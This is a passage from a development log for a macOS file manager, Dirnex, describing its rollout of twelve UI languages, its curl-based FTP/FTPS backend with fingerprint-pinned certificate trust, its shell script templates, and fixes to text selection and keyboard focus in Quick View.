    сжатия)`, all fitting the popup.
  - **The one genuine miss: iCloud Drive's tab title and path-bar crumb** both read
    `ICloudLocation.mergedName` straight out of the core. The Trash had the answer next door and even
    said so in a comment — `pathSummary` is a stable English *identity*, the `title` is what's shown
    and localizes — and iCloud used the same constant for both. Invisible in Russian, where Apple
    keeps the product name; it would surface the first time a language transliterates it.
  - The extracted-vs-catalogued diff over every `.stringsdata` now comes back **clean**, with one
    deliberate survivor: `DisplayRepresentation(title: "\(name)")` in `DirnexOperationEntity` extracts
    `%@` because both arguments are already localized upstream. That is the shape the `noWindow` bug
    wore, so it is worth knowing which instances are legitimate.
- **Pass 2 is complete.** Every AppKit/SwiftUI literal and every registry-owned string is wrapped and
  Russian-filled across Slices 1–13, the automation surface included. One documented non-goal stays
  English: the stock Finder-tag *names* in the ⌃T menu, which are `DirnexCore` `systemTagName` data
  with the localization caveat already in `FinderTag`. The AppleScript `.sdef` terminology stays
  English by design — it is a scripting vocabulary, not prose. Pass 3 — the additional
  languages — followed.

**Pass 3 — the additional languages (2026-07-26 → 07-29, twelve slices, landed).** Adding one is a
line in `AppLanguages.all` plus its column in the catalog; `LocalizationCoverageTests` fails until the
column is complete. It was **parked on 2026-07-25 behind M13**, deliberately: the machinery was
already proven by a real language, so the remaining languages were a translation exercise with no
design risk left in them, and every string M13 added would have had to be translated twice if the
languages had landed first. M13 shipped on 07-25 with its 23 strings settled in English + Russian,
which cleared the gate; the twelve slices then landed one language at a time over four days, each on
a `Localization/…` branch of its own with the manual vocabulary corrections as follow-up commits.

- **Slice 1 landed (2026-07-26): French.** `fr` / `Français` is now a shipped language, listed in
  Settings and matched from French regional tags such as `fr-CA`. Its complete `Localizable`
  column (786 entries, including every plural variant) and both App Shortcut phrases are present in
  the built `fr.lproj`. The function bar and command-category captions received a manual UI pass so
  they use correct whole verbs and nouns. The Synchronize sheet keeps the three complete direction
  labels on their own row, sizing each segment to its localized caption so no language is cut off.
  `LocalizationCoverageTests` now checks French alongside Russian; the app bundle test confirms it
  is compiled and all registry data is translated.
- **Slice 2 landed (2026-07-26): Spanish.** `es` / `Español` is a shipped language, listed in
  Settings and matched from Spanish regional tags. Its complete `Localizable` column (786 entries,
  including every plural variant) and both App Shortcut phrases are present in the catalog, so
  `LocalizationCoverageTests` checks Spanish alongside French and Russian. A manual macOS-style pass
  kept the Spain-style platform vocabulary (`función rápida`, `ítem`, `por omisión`, `Ajustes del
  Sistema`) and aligned Finder/AppKit terms where they matter: `Conectarse a un servidor…`,
  `Ocultar otras apps`, and lowercase `papelera` in actions and prose while standalone sidebar/title
  labels remain `Papelera`. The diff-tool footer also now says it opens files in the selected app,
  not in Dirnex itself, and the palette tour title was rewritten as natural Spanish rather than a
  literal English calque.
- **Slice 3 landed (2026-07-27): German.** `de` / `Deutsch` is a shipped language, listed in
  Settings and matched from German regional tags such as `de-AT`. Its complete `Localizable` column
  (799 entries, including every plural variant) and both App Shortcut phrases are present in the
  catalog and compiled into `de.lproj`, so `LocalizationCoverageTests` now checks German alongside
  Spanish, French and Russian. A manual macOS-style pass kept product and platform terms unchanged
  where they should stay unchanged (`Dirnex`, `macOS`, `Git`, `Zip`, `7-Zip`) and corrected the
  file-manager vocabulary the automatic pass got wrong: `Papierkorb`, `Datei`, `Ordner`,
  `Laufwerke`, `Befehl`, `Kopieren`, and `Verschieben`. The same pass preserved existing casing
  rules for lowercase keyword/search terms and kept the function bar on whole German verbs.
- **Slice 4 landed (2026-07-28): Portuguese (Brazil).** `pt-BR` / `Português (Brasil)` is a
  shipped language, listed in Settings and matched from Brazilian Portuguese regional tags. Its
  complete `Localizable` column (803 entries, including every plural variant) and both App Shortcut
  phrases are present in the catalog and compiled into `pt-BR.lproj`, so
  `LocalizationCoverageTests` now checks Portuguese alongside German, Spanish, French and Russian.
  The manual macOS-style pass kept names and common technical terms unchanged (`Dirnex`, `Apple`,
  `macOS`, `Git`, `Zip`, `7-Zip`) and used natural Brazilian Portuguese for app UI (`Ajustes`,
  `Lixo`, `arquivo`, `pasta`, `etiqueta`) while preserving the same casing pattern as the existing
  languages. The function bar keeps whole Portuguese verbs.
- **Slice 5 landed (2026-07-28): Simplified Chinese.** `zh-Hans` / `简体中文` is a shipped language,
  listed in Settings and matched from Simplified Chinese regional tags such as `zh-CN` and `zh-SG`.
  Its complete `Localizable` column (803 entries, including every plural variant) and both App Shortcut
  phrases are present in the catalog and compiled into `zh-Hans.lproj`. A manual macOS-style pass
  kept product names unchanged (`Dirnex`, `Finder`, `iCloud Drive`, `Git`, `Zip`, `7-Zip`) and used
  platform wording such as `设置`, `废纸篓`, `完全磁盘访问权限`, `快速查看`, `边栏`, `宗卷`, `标签`,
  `拷贝`, `移动`, and `重新命名`. The function bar keeps whole Chinese command verbs.
- **Slice 6 landed (2026-07-28): Japanese.** `ja` / `日本語` is now a shipped language, listed in
  Settings and matched from Japanese regional tags. Its complete `Localizable` column (803 entries,
  including every plural variant) and both App Shortcut phrases are present in the catalog and
  compile into `ja.lproj`. The manual macOS-style pass kept product names unchanged (`Dirnex`,
  `Finder`, `iCloud Drive`, `Git`, `Zip`, `7-Zip`) and used platform wording such as `設定`,
  `ゴミ箱`, `フルディスクアクセス`, `クイックルック`, `サイドバー`, `ボリューム`, `タグ`,
  `コピー`, `移動`, and `名前を変更`. The function bar keeps whole Japanese command verbs.
- **Slice 7 landed (2026-07-29): Traditional Chinese.** `zh-Hant` / `繁體中文` is now a shipped
  language, listed in Settings and matched from Traditional Chinese regional tags such as `zh-TW`,
  `zh-HK`, and `zh-MO`; `zh-CN` and `zh-SG` still resolve to Simplified Chinese. Its complete
  `Localizable` column (803 entries, including every plural variant) and both App Shortcut phrases
  are present in the catalog and compile into `zh-Hant.lproj`. The manual macOS-style pass kept
  product names unchanged (`Dirnex`, `Finder`, `iCloud Drive`, `Git`, `Zip`, `7-Zip`) and used
  natural Traditional Chinese macOS wording such as `設定`, `垃圾桶`, `完整磁碟取用權限`, `側邊欄`,
  `卷宗`, `標籤`, `拷貝`, `移動`, and `重新命名`. The function bar keeps whole Chinese command verbs.
- **Slice 8 landed (2026-07-29): Korean.** `ko` / `한국어` is now a shipped language, listed in
  Settings and matched from Korean regional tags such as `ko-KR`. Its complete `Localizable` column
  (803 entries, including every plural variant) and both App Shortcut phrases are present in the
  catalog and compile into `ko.lproj`. The manual macOS-style pass kept product names unchanged
  (`Dirnex`, `Finder`, `iCloud Drive`, `Git`, `Zip`, `7-Zip`) and used natural Korean macOS wording
  such as `설정`, `시스템 설정`, `전체 디스크 접근 권한`, `휴지통`, `훑어보기`, `사이드바`,
  `볼륨`, `태그`, `복사`, `이동`, and `이름 변경`. The function bar keeps whole Korean command labels.
- **Slice 9 landed (2026-07-29): Italian.** `it` / `Italiano` is now a shipped language, listed in
  Settings and matched from Italian regional tags such as `it-IT`. Its complete `Localizable` column
  (803 entries, including every plural variant) and both App Shortcut phrases are present in the
  catalog and compile into `it.lproj`. The manual macOS-style pass kept product names unchanged
  (`Dirnex`, `Finder`, `iCloud Drive`, `Git`, `Zip`, `7-Zip`) and used natural Italian macOS wording
  such as `Impostazioni di Sistema`, `Accesso completo al disco`, `Cestino`, `Vista rapida`,
  `barra laterale`, `volumi`, `tag`, `Copia`, `Sposta`, and `Rinomina`. The function bar keeps
  whole Italian command labels.
- **Slice 10 landed (2026-07-29): Dutch (Netherlands).** `nl` / `Nederlands` is now a shipped
  language, listed in Settings and matched from Dutch regional tags such as `nl-NL`. Its complete
  `Localizable` column (802 entries, including every plural variant) and both App Shortcut phrases
  are present in the catalog and compile into `nl.lproj`. The manual macOS-style pass kept product
  names unchanged (`Dirnex`, `Finder`, `iCloud Drive`, `Git`, `Zip`, `7-Zip`) and used natural Dutch
  macOS wording such as `Systeeminstellingen`, `Volledige schijftoegang`, `prullenmand`,
  `Snelle weergave`, `navigatiekolom`, `schijven`, `Finder-tags`, `Kopieer`, `Verplaats`, and
  `Hernoem`.
  The catalog keeps Dutch ordered between Korean and Russian, and the function bar keeps whole Dutch
  command labels.
- **Slice 11 landed (2026-07-29): Polish.** `pl` / `Polski` is now a shipped language, listed in
  Settings and matched from Polish regional tags such as `pl-PL`. Its complete `Localizable` column
  (802 entries, including every plural variant) and both App Shortcut phrases are present in the
  catalog and compile into `pl.lproj`. The manual macOS-style pass kept product names unchanged
  (`Dirnex`, `Finder`, `iCloud Drive`, `Git`, `Zip`, `7-Zip`) and used natural Polish macOS wording
  such as `Ustawienia systemowe`, `Pełny dostęp do dysku`, `Kosz`, `Szybki podgląd`, `pasek boczny`,
  `woluminy`, `tagi Findera`, `Kopiuj`, `Przenieś`, and `Zmień nazwę`. The catalog keeps Polish
  ordered between Dutch and Brazilian Portuguese, and the function bar keeps whole Polish command
  labels.
- **Slice 12 landed (2026-07-29): Ukrainian.** `uk` / `Українська` is now a shipped language,
  listed in Settings and matched from Ukrainian regional tags such as `uk-UA`. Its complete
  `Localizable` column (802 entries, including every plural variant) and both App Shortcut phrases
  are present in the catalog and compile into `uk.lproj`. The manual macOS-style pass kept product
  names unchanged (`Dirnex`, `Finder`, `iCloud Drive`, `Git`, `Zip`, `7-Zip`) and used Ukrainian
  platform wording such as `Системні параметри`, `Повний доступ до диска`, `Кошик`,
  `Швидкий перегляд`, `бічна панель`, `томи`, `теги Finder`, `Копіювати`, `Перемістити`, and
  `Перейменувати`. The catalog keeps Ukrainian ordered between Russian and Simplified Chinese, and
  the function bar keeps whole Ukrainian command labels.

**Standing rule for the function bar, in every language.** The seven F-key captions are the app's
primary buttons and are on screen permanently, so they carry the first impression of the whole app:
each is a **whole verb** — imperative or infinitive, whichever that language uses for menu commands
— and never a clipped or abbreviated form. "Копировать", not "Копир." or "Копия"; "Переместить",
not "Перемещ.". A noun phrase is right only where the command names a thing rather than an action
(F7 "Новая папка"). Where the verb matches the command's own menu title, use the same word, so the
button and the menu item read as one command. Prefer the shorter of two correct verbs — the cells
are narrow — but never buy width by cutting a word. The rule is repeated in the `comment` of every
`functionBar.*.label` entry, which is where a translator actually reads it.

Deliberately excluded: the AppleScript `.sdef` terminology, since scripting vocabulary is
conventionally English and translating it breaks users' scripts. That covers the verb *names* only —
the error messages those verbs report are prose and were translated in Slice 13, keeping the verb
names verbatim inside the sentences. App Intents titles, descriptions and phrases landed there too.

Exit: the app runs end to end in a language other than English — menu bar, palette, function bar,
panes, sheets, alerts, the sidebar, the automation surface and the error paths — with the language
either matched from the system's preferences or pinned in Settings, and a relaunch that carries the
session across. ✅ met: verified live in Russian, slice by slice, through Passes 1–2, and each Pass 3
language by a complete catalog column compiled into its own `.lproj` plus a manual
macOS-vocabulary pass.

### M13 — FTP and FTPS (S–M)

Two more remote protocols through the seam M5 already cut. Nearly all of the cost was paid then:
`ServerConnection` says in its own doc comment that it "unifies the two protocols the app speaks so a
single list, store, and sidebar section cover both", and `SFTPLocation`'s scheme-descriptor →
`VFSBackendID` → `CompositeBackend` routing is a template rather than a precedent. What is genuinely
new is one parser, one transport, and one trust decision.

The transport was **probed live before any Swift was written** (2026-07-25, per the working rhythm in
[NOTES.md](NOTES.md)), and one finding moved the design — so this milestone is shaped around
what the wire actually does.

- [x] `FTPBackend` over an injected `FTPTransport`: browse, byte transfer with resume, remote mkdir /
      rename / delete, all through the standard queue. Capabilities are `[.read, .write, .rename]` —
      no `.trash`, no `.clone`, no `.watch` — so `deleteStrategy` resolves to `.permanent` and the M5
      degradation path (grey-out + Trash-less confirmed-permanent-delete) lights up with no new UI.
      No `.watch` means no live refresh: refresh-on-focus and manual refresh, exactly as SFTP does.
- [x] **Plain FTP, FTPS-explicit (`AUTH TLS` on port 21) and FTPS-implicit (port 990)**, plus
      **anonymous** login. Both extras are in scope rather than deferred because both are nearly free:
      implicit FTPS is a URL scheme, anonymous is one checkbox — and anonymous is most of what public
      FTP actually is.
- [x] `FTPListingParser`: the Unix `ls -l` LIST form and the DOS/IIS variant, pure and tested against
      the real bytes captured in the probe.
- [x] Certificate trust for FTPS, in the same shape as SFTP's host-key pinning — fingerprint shown,
      trusted explicitly by the user, decision stored. **Never a blanket "don't verify".**
- [x] `ServerKind.ftp` / `ServerEndpoint.ftp` + Keychain, so the Servers sidebar section, the connect
      prompt, the store and its rename/reorder cover FTP with no new surface.

Exit: connect to a real FTP server and a real FTPS server from the Servers sidebar, browse both, copy
a tree each way through the queue with a resumed transfer among them, and rename and delete remotely —
with a self-signed FTPS certificate trusted **by fingerprint**, not by disabling verification.

**The transport is the system `curl`,** which is the same call the project already made twice
(`bsdtar` over libarchive, `sftp` over swift-nio-ssh) and keeps the non-hermetic subprocess in the app
where CLAUDE.md's architecture rules put it. It is also the only option actually on the machine: macOS
ships **no `ftp`, `tnftp` or `lftp`** — probed, only `/usr/bin/curl` exists (8.7.1, `Protocols: … ftp
ftps …`). Every `VFSBackend` verb maps onto it, and the mapping was exercised against two live
servers rather than read off a man page: `listDirectory` → `curl ftp://host/dir/`; `stat` → the parent
listing (the trick `SFTPBackend` already uses) or `-I` for `SIZE` + `MDTM`; `createDirectory` →
`-Q "MKD"`; `removeItem` → `-Q "DELE"` / `-Q "RMD"`; `moveItem` → `-Q "-RNFR"` + `-Q "-RNTO"`;
`copyFile` → `-o` / `-T` with `-C -` / `--append` to resume. A native `Network.framework` client was
the alternative and is rejected: control plus data channels, `PASV`/`EPSV`, TLS session reuse on the
data channel and every server quirk owned by hand, to buy progress granularity `curl` already reports.

**What the probe found, and what each fact costs:**

- **TLS 1.3 silently returns an *empty* FTPS listing on the system `curl`.** Measured: `--ssl-reqd`
  alone exits 18 (partial transfer) with **zero bytes**, while `--tlsv1.2 --tls-max 1.2` returns the
  correct listing. Identical on both SSL backends (SecureTransport, and LibreSSL via
  `CURL_SSL_BACKEND=openssl`), so it is not an Apple-API problem, and there is no newer `curl` to fall
  back to. It fails in the **quiet direction** — an empty listing reads as an empty remote directory —
  which is why the TLS-1.2 pin belongs in a pure, tested `FTPProcessArguments`, the analogue of
  `SFTPProcessArguments`, whose doc comment exists to stop exactly this class of flag from being
  dropped by someone tidying up. Re-measure the pin when the system `curl` next moves: it is a
  workaround for a specific version, not a property of FTPS.
- **LIST timestamps are year-less *and* zone-less** — real bytes: `Jul 25 17:26`. The year-less half is
  the `bsdtar -tvf` trap already in NOTES.md (roll the year back when the parsed date lands in the
  future); the zone-less half is worse, because the stamp is on the *server's* clock with nothing
  saying which. `MLSD` would fix it — `test.rebex.net` advertises `MLST … Modify*` — but **`curl`
  cannot send `MLSD`**, only `LIST` and `NLST` (`-l`). So FTP mtimes are **approximate by
  construction**, which is a constraint on a *different* subsystem: `DirectorySync` must not compare
  FTP files by `.sizeAndDate`, and should force `.content` on an FTP side. Per-file `-I` gives an exact
  `MDTM` but costs a round trip per row, so it is a stat-one-item path, never a listing path.
- **Self-signed certificates are common enough on FTPS to design for.** One of the two servers probed
  is rejected outright (`SSL certificate problem: self signed certificate`) — n=2 is no basis for a
  proportion, but a public *test* server being self-signed is the tell that private NAS boxes will be
  too. This is what makes the trust item above a deliverable rather than a nicety: without it, those
  servers are simply unreachable over FTPS, and the tempting one-flag fix silently disables
  verification for every server.
- **The password cannot go in `argv`.** `-u user:pass` is visible to any `ps`. Credentials go in via
  `-K -` (a config file on **stdin**), which keeps the secret off the command line *and* off disk —
  the same principle `SFTPAskpassHelper` already follows.
- **Verified directly:** LIST on plain FTP and on FTPS, download, upload (`-T`, with
  `--ftp-create-dirs`), and `DELE` + `RMD` (the probe directory is provably gone afterwards).
  `RNFR`/`RNTO` exited 0 and is confirmed *indirectly* — the following `DELE` of the **new** name
  succeeded and `RMD` then removed the directory, which only works when it is empty. **Not yet
  verified live: mid-file resume** (`-C -` / `--append`); the one attempt timed out against a flaky
  public server, so it is an M13 deliverable to prove, not a probe result to lean on.

**Slicing, core first (§2: if it touches bytes it lives in `DirnexCore` and has tests):**

1. **Core, purely additive — app untouched, no rebuild.** `FTPLocation` (schemes `ftp://` / `ftps://`,
   default port 21, `descriptor`, `keychainAccount`), the `FTPTransport` protocol, `FTPListingParser`,
   `FTPProcessArguments` and `FTPQuoteCommand` (pure and tested, the TLS pin and the shell-quoting
   among them), `FTPBackend`, and `ServerKind.ftp` / `ServerEndpoint.ftp`. Tested against a fake
   transport fed the bytes the probe captured.
2. **App.** `FTPCurlTransport` (`Process`, both pipes drained concurrently and the wait bounded — the
   `sftp` deadlock lesson applies unchanged, secret via `-K -`), an FTP branch in `ConnectServerForm` /
   `ConnectServerPrompt`, Keychain, `CompositeBackend` routing, the sidebar icon, and the
   certificate-trust prompt.
3. **Live verification and the M12 pass.** A real FTP and a real FTPS server, resume proven. The new
   strings then get the Pass-2 treatment — new `VFSUnsupportedReason` cases and connect-form labels —
   and any new alert needs `enableEscapeToCancel(safe:)`, since `NSAlert`'s Escape binding is
   English-only.

Deliberately out of scope: `MLSD` (the transport cannot send it); FTP-side `DirectorySync` by
timestamp (unreliable by construction, see above); write-back for files edited in place over FTP,
which is the same deferred edit-temp-watch-repack slice SFTP and archives are already waiting on.

**Slice 1 landed (2026-07-25).** Core only, app untouched: `FTPLocation`, `FTPSecurity`,
`FTPAuthentication`, `FTPTransport` + `FTPTransportError`, `FTPCertificate`, `FTPProcessArguments` +
`FTPConfigFile` + `FTPQuoteCommand`, `FTPListingParser`, `FTPBackend`, and `ServerKind.ftp` /
`ServerEndpoint.ftp`. 1173 core tests green, both linters clean. A second live probe against a real
FTP/FTPS server preceded the code and moved the design in five places:

- **Resume is proven** — the deliverable listed above as unverified. `-C -` works in *both*
  directions (not `--append`), byte-for-byte identical to a whole transfer, and `-w
  '%{size_download}'` / `'%{size_upload}'` report exactly the bytes moved this run. So the transport
  hands the backend its progress delta directly, where `SFTPBackend` has to subtract a prior size.
- **The exit code is the classification.** Every failure that matters has its own documented `curl`
  exit code (9/21/28/60/67/78/90 all observed by provoking them), so nothing scrapes prose — and
  unlike `SFTPTransportError.classify`, which greps English, it cannot be broken by a localized tool.
- **`--cacert` cannot trust a self-signed server**: it still fails on the name mismatch a NAS
  certificate always has (`CN=test-server.local` vs the IP the user typed). `--pinnedpubkey
  sha256//…` is the only mechanism that works, and it is exact — a wrong pin aborts with exit 90
  before any data moves, verified on both TLS backends. `curl -w '%{certs}'` yields the PEM, so the
  app needs no `openssl`.
- **The TLS-1.2 pin is now opt-in, not unconditional.** Forcing every server to 1.2 is a real
  downgrade for those that do 1.3 correctly, so `FTPProcessArguments` negotiates freely and the
  workaround is armed only after the documented symptom (exit 18). Still one tested place to
  re-measure, which was the point of putting it there.
- **Three schemes, not two.** `ftps://` already means *implicit* FTPS to `curl` and the RFC, so
  explicit — the mode everyone actually means — takes FileZilla's `ftpes://`. Two schemes cannot
  round-trip three modes, and a saved server decoding as the wrong one is silent.

Both §7 questions are **resolved** (2026-07-25, by the user): the connect form defaults to FTPS with
plain FTP a deliberate switch and no per-connect nagging; and transfers report one exact byte count
per file, matching what `SFTPProcessTransport` ships — `curl`'s meter was measured at ~1 Hz rounded
to `k`/`M`, good for a bar but not for accounting, and an intra-file bar is worth doing for both
backends together or not at all.

**Slices 2 and 3 landed (2026-07-25).** `FTPCurlTransport`, `FTPKeychain`, the FTP branch of the
connect form, `CompositeBackend` routing, the sidebar row and the certificate-trust prompt; then the
live run and the M12 pass. All four checks green (1173 core + 127 app tests, both linters clean).

**Exit criteria met, verified live against a real FTP/FTPS server** — first through a throwaway
harness compiled against the real core driving the real transport (every `VFSBackend` verb, resume
in both directions byte-compared against the original, a wrong pin refused, error classification),
then through the built app: connect over FTPS with the certificate trusted **by fingerprint**,
browse, F5 upload through the queue (the M2 conflict sheet resolved a name clash against the remote
with no new code), F8 delete degrading to a *confirmed permanent* delete, remote rename and
recursive delete, and a reconnect from the sidebar with no prompt — proving the stored pin and the
Keychain password. Resume, the deliverable this milestone inherited as unproven, is proven.

Three things the app half turned up, none of them in the core:

- **A new backend that is a *place* must be added to the path bar, or it silently renders as a
  search.** `PathBarView`'s chain has an explicit `sftpLocation` branch and an `else` that draws the
  results label, so FTP fell through and a freshly connected server's path bar read
  **"Results for /"**. Four more gates had the same shape — `wasVirtual` in `navigate`, the ⌘C
  validation, the copy-destination guard, and the clipboard guard all named `isSFTP` where they
  meant "a real remote directory". Every one compiled, and only connecting showed it.
- **The connect form could not hold a third protocol.** `ConnectServerForm` was already at
  `type_body_length`; FTP's fields went into their own object, and SMB's followed for symmetry, so
  each protocol now owns its fields in its own file. The picker's index comparison (`selectedSegment
  == 1` for SMB) became a named enum in the same pass — inserting FTP at index 1 would otherwise have
  re-pointed `isSMB` at it silently.
- **The plain-FTP note was clipped in Russian**, the exact class NOTES.md already records twice.
  A wrapping `NSTextField` with no width constraint takes its *intrinsic single-line* width, so it
  overran the sheet and lost its final period; the English text happened to fit. Pinning it to the
  field width makes it wrap, and the layout's reserved height already covered the second line. Only
  the live Russian run showed it.

Left for M12 Pass 3 rather than done here: nothing FTP-specific — the 23 new strings are English +
Russian and verified in the compiled `ru.lproj`, so the milestone leaves no localization debt behind
it. Two *pre-existing* gaps in the same dialog ("Fill in the required fields to connect.", "The
connection couldn’t be set up.") were filled while in there.

**Follow-on, 2026-07-26.** A live re-test against a multi-port test server (plain-only, explicit-only,
implicit, and a "TLS optional" port that accepts both) confirmed every mode end-to-end and turned up
one weak spot: a *mode/port mismatch* fell through to raw `curl` text or a misleading "check your
password". Two `FTPTransportError` cases now name it — `tlsNotAvailable` (explicit FTPS against a
plain-only port, `curl` exit 64 / `CURLE_USE_SSL_FAILED`) and `tlsRequired` (plain FTP against a
server that demands `AUTH TLS`, exit 67 with reply **503**, which `classify` splits from a genuine 530
login failure by the reply code). Both were observed live; the connect dialog now says "choose plain
FTP…" / "choose FTPS…" instead of blaming the credentials. An opportunistic **"TLS optional" client
mode was considered and rejected**: the three explicit modes reach every server, and `--ssl`'s silent
fall-back to cleartext is a password-downgrade vector — the same reason `FTPProcessArguments` emits
`--ssl-reqd`, not `--ssl`. So the gap "I don't know which mode this server needs" is closed by a clear
error and an explicit choice, not by guessing on the user's behalf.

### Script templates in the organizer's + menu (2026-07-26, VERIFIED LIVE)

A small M6 follow-on. The scripts organizer's hardest moment is the empty **Command** box: the sheet
explains `"$@"` in a three-line help label and then leaves the user to write shell from nothing, so
the two non-obvious parts of the mechanism (`perFile` mode, `$DIRNEX_OTHER_DIR`) were reachable only
by reading that label carefully. **+** now opens a menu — *Blank Script*, then five ready-made
templates — which is the standard macOS shape for a **+** that adds more than one kind of thing, and
costs no new chrome in a sheet already at 640×460.

A template is a **seed, not a built-in**: picking one saves an ordinary, fully editable `UserScript`
through the same path as a blank one (so a second copy lands as "Copy Paths 2") and is then
forgotten. Live built-ins would have owed the user answers — can I delete this, what happens to my
edits on the next update — for nothing the seed does not already deliver.

`UserScriptTemplate` is `DirnexCore` data with the registry treatment the tour screens get:
`id` is the stable translation key, `title`/`keywords` are the English fallback, and
`LocalizationKey.userScriptTemplateTitle/Keywords` + `LocalizedCatalog.script(for:)` join them, so a
Spanish user gets a script actually *named* "Copiar rutas" rather than one they have to rename by
hand. The **body is never translated** — it is shell code. `LocalizationCoverageTests` fails on an
untranslated template (10 symbolic keys, fr/ru/es filled).

**The bodies were probed before they were written, and three findings changed them:**

1. **The runner discards stdout.** `UserScriptRunner` sends it to `/dev/null` and surfaces stderr
   only on a non-zero exit, so a template that merely *prints* would do nothing visible — which rules
   out the obvious `du -sh` / `shasum` demos unless they pipe. Every template has a side effect
   instead; *Copy Paths* is `printf '%s\n' "$@" | pbcopy` precisely because the pasteboard is how a
   script talks back.
2. **`xattr -d` exits 1** ("No such xattr") on a file that was never quarantined, which would raise
   the failure alert for an ordinary selection. `xattr -dr` exits **0** on the same input, so *Remove
   Quarantine Flag* uses the recursive form — for its exit code, not for the recursion.
3. **`$DIRNEX_OTHER_DIR` unset expands to `tar -czf /<date>.tgz`**, failing at the root of the disk
   with a message naming a path the user never chose. The guard in *Archive to Other Panel* is
   load-bearing rather than polite, and its `echo …>&2` is what reaches the alert.

Two smaller calls, both non-destructive by choice: `sips -Z 1200 "$1"` overwrites the original, so
*Resize Images* writes `photo-1200.heic` beside it (`${1%.*}` / `${1##*.}`); and `sips` exits **0**
with a stderr warning on a non-image, so both image templates are quiet on a mixed selection rather
than raising an alert — its choice, not ours, and worth knowing before anyone "fixes" it into a
type-checking loop. Every tool used ships with macOS: a template needing Homebrew would be a broken
demo on the machine of the person most likely to try one.

Verified live: the menu drops under **+** with all six items; *Convert Images to JPEG* seeded with
its body, its keywords and **Run once per selected file** already selected; typing `clipboard` in the
palette found the seeded *Copy Paths* through its translated-and-additive keywords; running it put
`/Users/oleg/swtest/DSC_0697-Панорама.jpg` on the pasteboard — a non-ASCII name arriving intact
through argv, which is the security boundary `UserScript` documents.

### Selectable text in Quick View (2026-07-27, VERIFIED LIVE)

An M11 follow-on with an M11-shaped answer. A `.txt` preview could not be selected or copied — PDFs
could, because they had already been routed away from Quick Look. `QLPreviewView` renders **out of
process** and declines the clicks it is handed, and the surface must therefore swallow the mouse
whole (a declined click is re-dispatched to the file table underneath, which moved the covered pane's
cursor invisibly). So there is no version of "let Quick Look have the mouse" that is safe, and text
took the route `PDFView` and `NSImageView` took before it: **decode it ourselves and render it
in-process**, where a drag selects and ⌘C copies because `NSTextView` implements them itself.

`TextPreview` (core, 16 tests) is the decode; `QuickViewTextView` is the view. Routing is
`conforms(to: .text)` **minus HTML and RTF** — Quick Look renders those as the *document* they
describe, and showing their markup instead would be a regression wearing a feature's clothes.

**The decode was probed against real bytes first, and three findings shaped it:**

1. **UTF-16 with no BOM is valid UTF-8** — the NULs are legal — so a UTF-8-first decode *succeeds*
   and renders `П\0р\0и\0в…`. Nothing identifies those bytes (Foundation's detector answers
   **nothing** for them, and nothing for 64 KiB of `/bin/ls` either), so a NUL byte is read as
   "binary" and the file falls back to Quick Look. BOM-marked UTF-16/32 is decoded before that gate,
   UTF-32's LE mark tested before UTF-16's because it starts with the same two bytes.
2. **Foundation's detector is right about Windows-1251 and Latin-1, wrong about KOI8-R** (it answers
   "Arabic (Windows)") **and lossy about MacRoman** (`Caf<?> na夫e` for `Café naïve`). A lossy answer
   is refused rather than shown as mojibake; there is nothing better short of shipping a charset
   detector, and this is what TextEdit would show.
3. **TextKit 2 lays out lazily**: showing a 64 MiB document measured ~10 ms and jumping to its end
   ~5 ms, so the 4 MiB cap is about the *read*, not the render — the preview re-runs on every cursor
   step. Past it the file is cut and says so («Показаны первые 4 МБ файла»), which is why the notice
   exists at all.

**The live run found a bug that was already shipped, in the PDF backend.** In pane mode the preview
covers the *inactive* pane and is a subview of it, so a backend the user can click into puts first
responder inside that pane's hierarchy — and the responder chain then runs through the **covered**
pane's `PanelViewController`. One F5 after a click into a text preview copied a folder out of the
pane nobody was looking at, in the wrong direction, with no dialog. `QuickViewPreviewView` now hands
its `nextResponder` to the **window**, which is what the two full-size modes already do structurally
(they are siblings of the panes), so a preview holding focus makes pane commands find no target
instead of the wrong one. Re-run afterwards: the same F5 does nothing, and ⌘C still copies the
selection.

Verified live in a Russian build: a drag selected a line and ⌘C put exactly it on the pasteboard
(the pane's own ⌘C still copies the *file* when the table has focus); ⌘A selected the document, not
the pane's files; a double-click selected a word in the user's own `text.txt`; a binary named
`fake.txt` fell back to Quick Look's dump; ← / → still flipped files; images and PDFs unchanged.
**Esc-while-the-text-has-focus is unverified** — the Esc monitor now recognizes
`QuickViewDocumentTextView` as the one `NSText` it should not stand aside for, but synthetic Escape
is never delivered into the app, so that path needs a physical key press.

### The arrows a focused preview was eating (2026-07-27, VERIFIED LIVE)

The half of the previous entry its own verification could not see. Selecting text in Quick View put
first responder on the text view, and from there **the arrows stopped walking the file list** — in
all three sizes, ⌃Q as much as ⌃⇧Q and ⌃⌥Q. The pass above did check that "← / → still flipped
files", and it was true: it was checked without clicking into the text first, which is the one input
that cannot expose the bug. The same shape as the palette's missing English title, one slice later.

The tell that this was a *class* and not a text-backend bug: **the two-finger swipe went on
working**, in the two modes that have one, which is what the report singled out. The gesture is a
window-scoped monitor, so no focused view can eat it — and every flip it makes ends in
`restoreTableFocus`, so it silently repairs the focus the click moved. The keyboard had neither half.
`PDFView` had had the identical bug since it shipped, for the identical reason (measured: click into
a PDF, ← does nothing).

So the fix is the keyboard's copy of what the gesture already had, folded into the Esc monitor that
was already watching `keyDown` for the same reason (a focused `PDFView` may never translate Esc into
`cancelOperation:`) — `escapeMonitor` became `quickViewKeyMonitor`, with one branch per key. On a
bare arrow, when first responder is inside any preview surface, it hands focus back to the
**focused** pane's table and **lets the event travel** rather than swallowing it.

That last part is the whole design, and it rests on a probed fact: **a local key monitor runs before
responder dispatch, so moving first responder inside it delivers that same event to the responder it
just set.** Probed in a throwaway AppKit app before any Dirnex code was written (two views, a posted
keyDown, the monitor re-pointing focus mid-flight — the key landed in the new view). It means
`FileTableView.keyDown` stays the single definition of what an arrow does — a flip at full size, a
plain cursor step in pane mode, `..` handling and the ends of the list included — instead of this
monitor carrying a second copy that could drift from it.

Bare arrows only: ⇧← still extends a selection in the text the user is in the middle of selecting,
which is the escape hatch that makes "the arrows belong to the file list" affordable.

Verified live in a Russian build, all three sizes: ⌃⇧Q on `text.txt` (9 из 9) → drag-select three
lines → ← → `fine_payment.pdf` (8 из 9); click into that PDF → ← → `dv2025.pdf` (7 из 9), the
backend that never had this working; ⌃⌥Q full screen, select, ← → the same flip; ⌃Q pane mode, where
the preview covers the *other* pane, select → ↑ moved the active pane's cursor and re-emphasized its
row. And the guard: ⇧↓ ⇧↓ extended the text selection with the cursor staying put.
**Esc-while-a-preview-has-focus stays unverified for the same reason as last time** — synthetic
Escape is never delivered — and its logic is unchanged, only reshaped into `escapeBelongsToQuickView`.
